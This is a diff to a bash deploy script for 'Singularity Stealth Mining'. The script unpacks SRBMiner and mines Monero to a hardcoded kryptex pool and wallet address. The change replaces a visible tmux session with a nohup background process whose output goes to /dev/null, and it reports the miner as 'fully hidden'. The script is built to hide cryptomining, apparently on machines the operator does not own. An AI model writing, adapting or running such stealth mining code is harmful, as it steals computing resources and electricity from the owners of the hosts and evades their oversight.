@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Singularity Stealth Mining - Auto Deploy
-# Replace YOUR_GITHUB_USERNAME and YOUR_REPO_NAME below
+# Configured for temporaxinfinity-pixel/singular
 
 GITHUB_USER="temporaxinfinity-pixel"
 REPO_NAME="singular"
@@ -46,8 +46,8 @@ mv SRBMiner-Multi-3-4-3 singularity_miner
 cd singularity_miner
 chmod +x SRBMiner-MULTI
 
-echo "[*] Starting mining..."
-tmux new-session -d -s singularity_work './SRBMiner-MULTI --algorithm randomx --disable-gpu --pool xmr-sg.kryptex.network:8029 --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/StealthRig"'
+echo "[*] Starting mining in background..."
+nohup ./SRBMiner-MULTI --algorithm randomx --disable-gpu --pool xmr-sg.kryptex.network:8029 --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/StealthRig" > /dev/null 2>&1 &
 
 sleep 5
 
@@ -67,7 +67,7 @@ if [ -n "$PID" ]; then
     
     echo ""
     echo "[✓] DEPLOYMENT COMPLETE"
-    echo "Tmux: tmux attach -t singularity_work"
+    echo "[*] Miner running in background (fully hidden)"
 else
     echo "[!] Miner failed to start"
 fi
